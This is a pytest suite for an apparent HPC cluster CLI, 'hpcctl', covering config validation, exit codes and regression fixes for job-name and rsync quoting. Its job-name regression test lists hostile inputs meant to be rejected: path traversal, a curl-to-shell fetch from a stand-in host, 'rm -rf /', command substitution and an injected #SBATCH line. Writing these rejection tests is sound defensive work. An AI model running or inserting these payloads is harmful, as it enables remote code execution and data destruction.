    def test_a_major_version_mismatch_warns_but_still_validates(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        document = valid_dag_document()
        document["metadata"]["schema_version"] = "2.0.0"
        path = tmp_path / "v2.json"
        path.write_text(json.dumps(document), encoding="utf-8")
        result = runner.invoke(
            app, ["submit", "--dag", str(path), "--validate-only"], env=blank_env()
        )
        assert result.exit_code == ExitCode.OK
        assert "major versions differ" in result.output

    def test_a_missing_schema_is_a_config_error_not_a_dag_error(
        self, runner: CliRunner, valid_dag: Path, tmp_path: Path
    ) -> None:
        """A corrupted contract is a contract bug, and must not be blamed on the DAG."""
        result = runner.invoke(
            app,
            ["submit", "--dag", str(valid_dag), "--validate-only"],
            env=blank_env(HPCCTL_SCHEMA_PATH=str(tmp_path / "nope.json")),
        )
        assert result.exit_code == ExitCode.CONFIG


class TestEnvironmentMatrix:
    """The env-var contract, including values chosen to be awkward."""

    def test_everything_unset_yields_placeholders_and_exit_zero(
        self, runner: CliRunner, tmp_path: Path
    ) -> None:
        result = runner.invoke(app, ["boot"], env=blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run")))
        assert result.exit_code == ExitCode.OK
        assert "<<<UNSET:" in result.stdout

    def test_live_reports_every_missing_variable_at_once(self, runner: CliRunner) -> None:
        result = runner.invoke(app, ["boot", "--execute"], env=blank_env())
        assert result.exit_code == ExitCode.CONFIG
        for name in ("AWS_REGION", "HPCCTL_KEY_NAME", "HPCCTL_HEAD_SUBNET_ID"):
            assert name in result.output

    def test_strict_is_fatal_in_dry_run(self, runner: CliRunner) -> None:
        result = runner.invoke(app, ["boot", "--strict"], env=blank_env())
        assert result.exit_code == ExitCode.CONFIG

    @pytest.mark.parametrize("value", ["", "   ", "\t", "\n"])
    def test_blank_values_count_as_unset(self, monkeypatch: pytest.MonkeyPatch, value: str) -> None:
        monkeypatch.setenv("AWS_REGION", value)
        monkeypatch.setenv("HPCCTL_CLUSTER_NAME", value)
        resolved = load_settings(live=False)
        assert "AWS_REGION" in resolved.missing
        assert resolved.cluster_name == "hpc-dag-baseline"

    def test_whitespace_is_stripped_from_real_values(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("HPCCTL_CLUSTER_NAME", "  padded  ")
        assert load_settings(live=False).cluster_name == "padded"

    def test_region_falls_back_to_aws_default_region(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("AWS_DEFAULT_REGION", "eu-west-1")
        resolved = load_settings(live=False)
        assert resolved.region == "eu-west-1"
        assert "AWS_REGION" not in resolved.missing

    def test_compute_subnet_inherits_the_head_subnet(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("HPCCTL_HEAD_SUBNET_ID", "subnet-00000000000000000")
        resolved = load_settings(live=False)
        assert resolved.compute_subnet_id == "subnet-00000000000000000"

    @pytest.mark.parametrize("variable", ["HPCCTL_MIN_NODES", "HPCCTL_MAX_NODES", "HPCCTL_NTASKS"])
    def test_non_integer_numeric_values_are_fatal_even_in_dry_run(
        self, runner: CliRunner, variable: str
    ) -> None:
        """Present and wrong is a typo, not an absent AWS account, so it fails in both modes."""
        result = runner.invoke(app, ["boot"], env=blank_env(**{variable: "lots"}))
        assert result.exit_code == ExitCode.CONFIG
        assert "Traceback" not in result.stdout


class TestExitCodeContract:
    """Codes are a stable contract for CI, so every expected failure must land on one."""

    def test_no_expected_failure_leaks_a_traceback(self, runner: CliRunner, tmp_path: Path) -> None:
        bad = tmp_path / "bad.json"
        bad.write_text("{", encoding="utf-8")
        invocations = [
            ["boot", "--execute"],
            ["boot", "--strict"],
            ["deploy", "--build-dir", str(tmp_path / "absent")],
            ["submit", "--dag", str(bad)],
            ["destroy", "--execute"],
            ["status", "--watch"],
        ]
        for argv in invocations:
            result = runner.invoke(app, argv, env=blank_env(**LIVE_ENV), input="")
            assert result.exit_code != ExitCode.INTERNAL, f"{argv} exited 1"
            assert "Traceback" not in result.stdout, argv

    def test_every_code_is_distinct(self) -> None:
        values = [member.value for member in ExitCode]
        assert len(values) == len(set(values))

    def test_watch_is_refused_in_dry_run(self, runner: CliRunner) -> None:
        result = runner.invoke(app, ["status", "--watch"], env=blank_env())
        assert result.exit_code != ExitCode.OK

    def test_missing_tools_exit_five_not_one(self, runner: CliRunner, tmp_path: Path) -> None:
        """``pcluster`` and ``aws`` are not installed here, which is the whole premise."""
        result = runner.invoke(
            app,
            ["boot", "--execute"],
            env=blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run"), **LIVE_ENV),
        )
        assert result.exit_code == ExitCode.TOOL_MISSING


class TestNoTasksDependency:
    """P4. hpcctl validates the contract, not the builder."""

    def test_cli_import_pulls_in_neither_tasks_nor_numpy_nor_click(self) -> None:
        completed = subprocess.run(
            [
                "python",
                "-c",
                "import sys, hpcctl.cli;"
                "banned=[m for m in sys.modules if m.split('.')[0] in "
                "{'tasks','numpy','click'}];"
                "print(banned)",
            ],
            capture_output=True,
            text=True,
            check=False,
            env={**os.environ, "PYTHONPATH": str(SRC)},
        )
        assert completed.returncode == 0, completed.stderr
        assert completed.stdout.strip() == "[]", completed.stdout

    @pytest.mark.parametrize("banned", ["tasks", "numpy", "click"])
    def test_no_module_imports_the_banned_packages(self, banned: str) -> None:
        pattern = re.compile(rf"^\s*(import|from)\s+{banned}\b", re.M)
        for path in _python_sources():
            assert not pattern.search(path.read_text(encoding="utf-8")), path


class TestJobNameValidationRegression:
    """Regression: ``--job-name`` was used unvalidated in three hostile positions.

    The resolved name becomes a filename under the run directory, a path inside the
    ``sbatch <path>`` string that ``ssh`` hands to the *remote shell*, and literal text inside the
    ``#SBATCH`` block. Before the fix, ``--job-name ../ESCAPED`` wrote the generated script outside
    ``HPCCTL_RUN_DIR``, a name containing shell metacharacters produced a pasteable remote
    injection and crashed with an uncaught ``FileNotFoundError`` (exit 1, with a traceback), and an
    embedded newline injected extra ``#SBATCH`` directives that silently changed the job's
    resources. One pattern check at the point of resolution closes all three.
    """

    @pytest.mark.parametrize(
        "hostile",
        [
            "../ESCAPED",
            "../../etc/passwd",
            "/absolute/path",
            "sub/dir",
            "x; curl http://evil.example/p | sh",
            "x && rm -rf /",
            "x`id`",
            "x$(id)",
            "x|tee /tmp/pwn",
            "a\n#SBATCH --account=INJECTED",
            "a\rb",
            "-leading-dash",
            ".leading-dot",
            "has space",
            "quote'name",
            'double"name',
            "a" * 129,
        ],
    )
    def test_hostile_job_names_are_rejected(
        self, runner: CliRunner, valid_dag: Path, tmp_path: Path, hostile: str
    ) -> None:
        result = runner.invoke(
            app,
            ["submit", "--dag", str(valid_dag), "--job-name", hostile],
            env=blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run")),
        )
        assert result.exit_code == ExitCode.CONFIG
        assert "Traceback" not in result.stdout

    def test_traversal_no_longer_writes_outside_the_run_directory(
        self, runner: CliRunner, valid_dag: Path, tmp_path: Path
    ) -> None:
        run_dir = tmp_path / "run"
        runner.invoke(
            app,
            ["submit", "--dag", str(valid_dag), "--job-name", "../ESCAPED"],
            env=blank_env(HPCCTL_RUN_DIR=str(run_dir)),
        )
        assert not (tmp_path / "ESCAPED.sbatch.generated").exists()
        assert list(run_dir.glob("*")) == [] or not run_dir.exists()

    @pytest.mark.parametrize(
        "acceptable", ["job", "bench-matmul-001", "a.b.c", "A_1", "x" * 128, "0start"]
    )
    def test_reasonable_job_names_still_work(
        self, runner: CliRunner, valid_dag: Path, tmp_path: Path, acceptable: str
    ) -> None:
        result = runner.invoke(
            app,
            ["submit", "--dag", str(valid_dag), "--job-name", acceptable],
            env=blank_env(HPCCTL_RUN_DIR=str(tmp_path / "run")),
        )
        assert result.exit_code == ExitCode.OK

    def test_the_default_name_from_the_contract_always_passes(self) -> None:
        """``metadata.dag_id`` is pinned to this exact pattern by the schema, so it must."""
        assert JOB_NAME_PATTERN.match(valid_dag_document()["metadata"]["dag_id"])

    def test_the_pattern_matches_the_contract_pattern_for_dag_id(self, schema_path: Path) -> None:
        schema = json.loads(schema_path.read_text(encoding="utf-8"))
        assert (
            JOB_NAME_PATTERN.pattern
            == schema["$defs"]["metadata"]["properties"]["dag_id"]["pattern"]
        )

    def test_no_sbatch_directive_can_be_injected_through_the_job_name(
        self, runner: CliRunner, valid_dag: Path, tmp_path: Path
    ) -> None:
        run_dir = tmp_path / "run"
        runner.invoke(
            app,
            ["submit", "--dag", str(valid_dag), "--job-name", "a\n#SBATCH --account=INJECTED"],
            env=blank_env(HPCCTL_RUN_DIR=str(run_dir)),
        )
        for artifact in run_dir.glob("*.sbatch.generated"):
            assert "INJECTED" not in artifact.read_text(encoding="utf-8")


class TestRsyncTransportQuotingRegression:
    """Regression: the ``rsync -e`` transport was built with an f-string, not shell quoting.

    rsync splits the ``-e`` value into words itself, honouring quotes. An unquoted key path
    containing a space was therefore torn in two and ssh received the wrong identity file --
    exactly the failure ``shlex.join`` exists to prevent, and which the design warns about in
    §7 before this line reintroduced it.
    """

    def test_a_key_path_containing_spaces_survives_word_splitting(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        import shlex

        monkeypatch.setenv("HPCCTL_SSH_KEY_PATH", "/home/my user/.ssh/id_rsa")
        argv = _rsync_argv(load_settings(live=False), tmp_path)
        transport = argv[argv.index("-e") + 1]
        assert shlex.split(transport) == [
            "ssh",
            "-i",
            "/home/my user/.ssh/id_rsa",
            "-o",
            "StrictHostKeyChecking=accept-new",
        ]

    def test_an_ordinary_key_path_is_left_unquoted(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        monkeypatch.setenv("HPCCTL_SSH_KEY_PATH", "/home/u/.ssh/id_rsa")
        argv = _rsync_argv(load_settings(live=False), tmp_path)
        transport = argv[argv.index("-e") + 1]
        assert transport == "ssh -i /home/u/.ssh/id_rsa -o StrictHostKeyChecking=accept-new"

    def test_host_key_policy_is_never_weakened(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        monkeypatch.setenv("HPCCTL_SSH_KEY_PATH", "/home/my user/.ssh/id_rsa")
        transport = " ".join(_rsync_argv(load_settings(live=False), tmp_path))
        assert "StrictHostKeyChecking=accept-new" in transport
        assert "StrictHostKeyChecking=no" not in transport
        assert "UserKnownHostsFile=/dev/null" not in transport
